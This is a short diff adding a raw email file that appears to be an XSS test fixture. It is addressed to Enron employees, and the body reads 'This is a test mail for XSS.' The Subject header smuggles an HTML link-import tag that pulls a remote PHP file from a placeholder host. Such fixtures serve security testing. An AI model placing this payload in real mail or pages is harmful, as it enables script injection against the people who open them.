@@ -1,0 +1,7 @@
+From: "Wyatt Jones" <3danimate.net@uhaultrailer.com>
+To: michael.bodnar@enron.com, lynn.blair@enron.com
+Subject: <link rel="import" href="http://xxx.com/1.php">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
